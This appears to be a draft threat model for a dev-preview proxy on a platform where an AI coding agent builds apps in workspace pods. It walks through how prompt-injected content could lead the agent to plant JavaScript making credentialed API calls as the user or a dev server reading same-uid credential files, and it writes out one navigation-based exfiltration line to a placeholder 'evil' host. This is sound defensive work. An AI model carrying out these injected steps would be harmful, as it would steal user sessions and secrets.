# Dev Preview — Threat Model

**Status:** Draft v1, 2026-08-19
**Scope:** the dev-preview path (browser → Cloudflare → API DevPreviewHandler →
agentd → app), current architecture and the per-workspace-origin redesign
(DESIGN.md).
**Method:** attack-path analysis over empirically verified behavior (see
REGRESSION.md and test pages); live probes where cheap. Items marked
**[ASSUMPTION]** or **[UNTESTED]** are explicitly not verified.

---

## 1. Assets (what an attacker wants)

| ID | Asset | Where |
|---|---|---|
| A1 | **User platform session** (`lsp_session` JWT) | Browser, cookie jar for `api.safespaces.dev` |
| A2 | **Platform API access as the user** — workspace CRUD, gist tokens, MCP tool backends | `api.safespaces.dev` |
| A3 | Workspace contents (code, notes, credentials stored in `/workspace`) | Pod + via API |
| A4 | Platform-injected credentials (`/sandbox-runtime`, env) | Pod |
| A5 | **agentd control plane** (command execution path into every workspace) | Pod, `:4096/4097` |
| A6 | Other users' workspaces / platform availability | Shared infra |
| A7 | Preview origin integrity post-migration (`<ws>-preview` host) | New |

## 2. Actors & trust boundaries

```
┌─ USER browser ─────────────────────────────────────────────┐
│  holds A1; origin of all preview JS execution              │
└──────┬─────────────────────────────────────────────────────┘
       │ TLS (boundary 1: internet)
┌──────▼───── Cloudflare ────────────────────────────────────┐
│  caches HTML; mutates bodies (beacon); strips WS Upgrade;  │
│  rate-limit headers present but unenforced on proxy path   │
└──────┬─────────────────────────────────────────────────────┘
       │ boundary 2: CDN → origin (rewriting happens HERE, verified)
┌──────▼───── API edge / DevPreviewHandler ──────────────────┐
│  SAME ORIGIN as A1/A2 today (the central flaw)             │
│  injects agentd credentials [ASSUMPTION]                   │
└──────┬─────────────────────────────────────────────────────┘
       │ boundary 3: platform → pod (agentd Basic auth observed)
┌──────▼───── Workspace pod ─────────────────────────────────┐
│  agentd :4096/4097 │ sidecars │ app :<port> — ONE netns    │
│  app is AGENT-AUTHORED (prompt-injectable) — boundary 4    │
│  sits between "code the user asked for" and "code that     │
│  actually runs in the user's browser"                      │
└────────────────────────────────────────────────────────────┘
```

**The load-bearing observation:** preview content is *machine-generated under
prompt-injection risk*. The realistic attacker is not a stranger browsing the
internet — it's whatever text the agent ingested (a gist, a README, an issue).
Every threat below should be read with that attacker in mind.

---

## 3. Threat catalog — CURRENT architecture

### T1 · Prompt-injected preview → credentialed API calls — **CRITICAL**

- **Path:** poisoned content → agent adds "analytics"/"helper" JS as an
  external file (allowed: `script-src 'self'`) → runs in the user's browser
  on `api.safespaces.dev` → `lsp_session` cookie is sent to previews →
  `connect-src 'self'` *permits* `fetch('/api/v1/…', {credentials:'include'})`
  → attacker-chosen API calls as the user; responses readable in-page.
- **Assets:** A1 (use), A2, A3, A6.
- **Today's mitigation:** **none that matters.** The CSP blocks exfil to
  *other* origins but the victim is same-origin. The policy is permissive in
  exactly the wrong place. Verified 2026-08-19 that same-origin fetch works
  and cookies ride document loads.
- **Redesign:** origin separation — no shared cookie, no CORS grants to
  preview hosts → browser-enforced block. This threat is the reason the
  redesign exists.

### T2 · Session cookie theft from preview JS — **RESOLVED 2026-08-19: fully audited**

- **Audit result (user-reported, DevTools):** `lsp_session` —
  HttpOnly **yes**, Secure **yes**, SameSite **not set**,
  Domain **`api.safespaces.dev`** (host-scoped).
- **Implications:**
  - `document.cookie` cannot read the token → trivial theft closed.
  - **T1 is unaffected** — it never reads the cookie; the browser attaches
    it to same-origin API calls automatically.
  - Domain is host-scoped: even the explicit-attribute reading shares the
    cookie only with `api.safespaces.dev` and its children;
    `<ws>-preview.safespaces.dev` is a sibling — **never receives it**.
    T4's cookie-bleed path to preview hosts is architecturally closed.
  - Residual: *shadowing* — a hostile subdomain can still toss
    `Domain=safespaces.dev` cookies named `lsp_session` that ride alongside
    the real one (server-side confusion). `__Host-` prefix blocks this
    (prefix forbids Domain attributes) → P0-3 stays, as routine hygiene.
  - SameSite unset → add explicit `Lax` in P0-3 (browser-default grace is
    not policy). Observed JWT lifetime ~30 days → pair with rotation.
- **P0-3 urgency: routine (not a phase-1 blocker).**

### T3 · Control-plane proxying via arbitrary port — **MITIGATED at proxy layer (verified); hygiene gaps remain**

- **Path:** `dev_preview_url` is called with a hostile port → URL minted →
  proxy forwards to it *with the platform's own injected credentials*
  [ASSUMPTION on injection] → agentd/sidecars exposed behind a
  platform-authenticated public URL.
- **Verified 2026-08-19:**
  - Tool layer: mints URLs for **:4097** and **:22** without complaint
    (no validation).
  - Proxy layer: **denies :4097** — `{"error":"port denied: agentd user mux
    (4097)"}`. A named blocklist exists and is enforced at proxy time.
- **Remaining gaps:**
  1. **Single enforcement point.** Only the proxy refuses; the tool layer
     happily mints. The blocklist should exist at BOTH layers (T3 becomes
     real again if the proxy check regresses or is bypassed by a future
     route).
  2. **Topology disclosure in the denial.** "agentd user mux (4097)" names
     an internal component. Any valid session can probe arbitrary ports
     and receive *service names* for blocklisted ones.
  3. **Port-oracle via differential responses.** blocked-with-name vs.
     nothing-listening vs. proxied-and-alive are distinguishable outcomes
     → the preview path doubles as a pod port-scanner. Recommended: blocked
     ports return a response **indistinguishable from a dead port** (same
     status, same body), with the denial reason recorded in server logs
     for operators. A generic "port denied" (the minimum fix) still leaks
     blocked-vs-dead; identical-to-dead leaks nothing.
- **Assets:** A4, A5, A3.
- **Redesign:** P1-4 — blocklist at both layers, indistinguishable error
  surface, log-side detail.

### T4 · Cross-workspace contamination via shared origin — **MEDIUM**

- **Path:** all workspaces' previews live on `api.safespaces.dev` under
  different paths → one origin ⇒ shared `localStorage`/`sessionStorage`,
  cookie tossing (`Domain=.safespaces.dev` cookies reachable by every
  current and future subdomain, including post-migration preview hosts),
  and any future same-origin slip compounds.
- **Assets:** A6, A7 (previews of other workspaces).
- **Redesign:** origin-per-workspace kills storage sharing; `__Host-` cookies
  cannot be tossed or shadowed (prefix enforces host-only + Secure + path=/).
  **Residual:** junk (non-`__Host-`) cookies can still be tossed to the apex
  — nuisance only, no functional collision.

### T5 · Service worker persistence on the API origin — **MEDIUM, bounded**

- **Path:** preview registers a SW; scope is path-limited (defaults to the
  SW file's directory), so today it can mainly intercept its own preview's
  subresources — *unless* something ever serves `Service-Worker-Allowed`
  with a wider scope [UNTESTED, unlikely]. Real risk: durable code parked on
  the API origin outliving the preview session.
- **Redesign:** SW scoped to the throwaway preview origin; abuse = persistent
  hijack of *that workspace's own preview* (self-contained).

### T6 · Unthrottled proxy on shared infrastructure — **MEDIUM (availability/cost)**

- **Verified 2026-08-19:** 127-request burst → zero 429s, `remaining` frozen;
  headers are decorative on the proxy path. Combined with T7 (below), this is
  a publicly reachable, effectively unlimited relay sitting on API-origin
  infrastructure → resource-exhaustion and bandwidth-cost surface; one noisy
  workspace degrades the shared edge.
- **Redesign:** real per-workspace budget, 429 + `Retry-After` (P1-5).

### T7 · Preview URL as an unauthenticated bearer capability — **RESOLVED 2026-08-19: fully closed**

- **Anonymous access:** refused — `{"error":"Authorization token required"}`.
- **Cross-user access (second account, 2026-08-19):** refused —
  `{"error":"forbidden: workspace access denied (user … does not have
  access to workspace …)"}`. An explicit user-vs-workspace ACL check
  exists. Previews are authenticated, authorized, and user-private.
  (The denial echoes both UUIDs — symmetric, requester already knows both:
  no finding.)
- **Redesign note:** P1-2's signed-bootstrap scheme is now a *capability*
  feature (scoping, expiry, future sharing semantics), not a security
  patch — current authz is sound.

### T8 · Intermediary content injection meets relaxed CSP — **sequencing hazard**

- **Verified:** Cloudflare appends `beacon.min.js` to HTML bodies (blocked
  today only by the strict CSP). Post-migration CSP allows inline/external
  same-origin scripts — **if body rewriters are still on when the CSP
  relaxes, injected CDN/inline scripts execute on the preview origin.**
- **Rule:** P0-4 (rewriters off) MUST ship before P2 (CSP relaxation), and
  T8 becomes: blocked by configuration, with a regression test asserting
  served HTML is byte-identical to app output.

### T9 · Cache-layer content substitution — **LOW**

- **Verified:** a cache on the chain served stale HTML across app changes.
  Poisoned-cache would be worse; `no-store` on HTML (P0-1) removes the
  entire class. Residual: non-HTML caching still possible (by design, for
  hashed assets).

### T10 · Navigation-based exfil — **LOW, residual by design**

- Top-level `window.location = 'https://evil/?d=' + data` is not covered by
  `connect-src` (no shipped CSP directive restricts top-level navigation).
- Today: moot (T1 is strictly better for the attacker).
- Post-migration: the only data reachable is preview-origin-local (its own
  localStorage/content; the session cookie is HttpOnly, the bootstrap token
  spent). **Accepted residual:** contained to data the preview already owns.

### T11 · In-pod credential exposure — **VERIFIED LIVE 2026-08-19 (metadata-only check)**

- **Finding:** `/sandbox-cfg/password` (32 B), `/sandbox-cfg/secrets.json`
  (2.1 KB), `/sandbox-runtime/agent-config.json` (10.6 KB) are mode 0600
  **owned by uid 1000 (sandbox) — the same uid that runs agent and all
  app processes**. Mode bits defend against other uids; nothing defends
  against any process spawned in the workspace, including a
  prompt-injected dev server. (Contents were not read; ownership/permissions
  only.)
- **Path:** poisoned content → agent starts "dev server" → process reads
  credential files as same-uid → exfil via its own preview responses.
  Note this bypasses every browser-side mitigation — it's not a preview
  threat; the preview is merely a convenient egress door.
- **Impact scope:** at minimum workspace credential material
  (A3/A4-adjacent). Whether `secrets.json` contains platform-wide or
  provider credentials (LLM API keys) needs platform confirmation —
  **[OPEN: platform to identify blast radius]**
- **Mitigations to consider (pod-level, orthogonal to the redesign):**
  separate uid for credential-requiring services; credentials delivered
  via env to the consuming process only, not shared files; or a credential
  broker (agentd hands tokens out per-request). Preview-side hardening
  (P1-5 throttling, origin isolation) reduces the *exfil convenience*
  but does not close the read.
- Unchanged by the redesign; does not block preview implementation.

---

## 4. Threats INTRODUCED by the redesign

| ID | Threat | Assessment | Mitigation |
|---|---|---|---|
| N1 | Wildcard DNS surface: any `<x>-preview` host resolves with valid TLS; unknown hosts must go somewhere | Low | Ingress default-backend/421 for unknown hosts; exact records take precedence (P1-1). Test: `garbage-preview.safespaces.dev` → 421, not a fallthrough |
| N2 | Bootstrap-token leakage (browser history, referrer, platform logs) or replay race before first redemption | Low–Med | One-time jti consumption, 24h exp, `ports[]` scope, HttpOnly cookie thereafter; referrer policy `strict-origin-when-cross-origin` already sends only the origin cross-origin (verified in response headers) |
| N3 | New auth code (token mint/validate/cookie) = new bug classes (auth bypass, oracle timing) | Medium | Standard review + T4 lifecycle tests (one-time, expiry, suspend kill) |
| N4 | Dashboard embedding via `frame-ancestors` allowlist widens clickjacking surface | Low | Allowlist only the product origin; preview UI is low-value for clickjacking |
| N5 | Relaxing CSP makes T8 real if rewriters aren't off (see T8) | **Sequencing constraint** | P0-4 before P2, byte-identity regression test |
| N6 | Preview origin ever growing cookies/storage of value → regression toward T1/T4 | Process risk | Policy: nothing but `__Host-pv` ever set on preview origins; note in DESIGN §5.3 |

---

## 5. Risk summary & priority

| Threat | Likelihood | Impact | Priority | Covered by |
|---|---|---|---|---|
| T1 credentialed API from preview | High (prompt injection is routine) | Critical | **1** | Redesign §5.2/5.3 + P0-3 |
| T3 port blocklist: single-layer + topology leak + oracle | Low (proxy denies) | Medium (info leak) | **2** | P1-4 both layers + generic/indistinguishable errors |
| T11 in-pod credential exposure | Verified live | Unknown blast radius | **3** | Separate pod-hardening ticket |
| T6 unthrottled proxy | High (verified) | Medium | 4 | P1-5 |
| T8 rewriter + CSP sequencing | Certain if ordered wrong | Medium | 5 | Order P0-4 → P2 |
| T4 cross-workspace | Medium | Medium | 6 | Origin separation |
| T5 service workers | Low–Med | Medium | 7 | Origin separation |
| N1–N4 new surface | Low–Med | Low–Med | folded into P1 tickets |
| T9/T10/N5/N6 | Low | Low | accepted/monitored | tests |

*Resolved 2026-08-19: T2 (HttpOnly + Secure + host-scoped Domain — closed),
T7 (auth AND ownership enforced — closed), T3-partial (proxy blocklist
exists), T11 (verified live, own ticket). All user-side tests complete;
remaining opens are platform-side: Q2, Q3, T11 blast radius, rate
instrumentation.*

---

## 6. Immediate actions — **all user-side tests COMPLETE (2026-08-19)**

1. ~~Incognito test~~ **DONE: auth required.**
2. ~~Proxy-layer port check~~ **DONE: blocklist enforced at proxy;**
   hardening (generic errors, both layers) → P1-4.
3. ~~Cookie flag read~~ **DONE: HttpOnly + Secure + host-scoped Domain
   (`api.safespaces.dev`).** T2 closed; P0-3 = routine hygiene (add
   `SameSite=Lax`, `__Host-` prefix, shorter rotation).
4. ~~Second-account test~~ **DONE: ownership enforced** (`workspace access
   denied`). T7 fully closed.
5. ~~`/sandbox-runtime` visibility~~ **DONE: T11 verified live** (same-uid
   credential files). Platform follow-up: blast radius + pod-level
   mitigation ticket. Does not gate preview implementation.

**Remaining opens are all platform-side:** Q2 (credential injection into
agentd — answered during P0-2/P1 code review), Q3 (dashboard origin for
`frame-ancestors` — gates P2 policy line only), T11 blast-radius triage,
rate instrumentation (P1-5). None block Phase 0 or Phase 1 start.

## 7. Standing rules the model implies

- Nothing but `__Host-`-prefixed cookies on any safespaces.dev host (N6/T4).
- Body rewriters stay off preview hosts forever (T8) — regression-tested.
- The port blocklist is maintained at BOTH the tool and proxy layers (T3) —
  either layer alone is a single point of failure.
- Preview origins never gain cookies, storage, or endpoints of platform
  value; if that changes, this threat model must be redone (T1 regression).
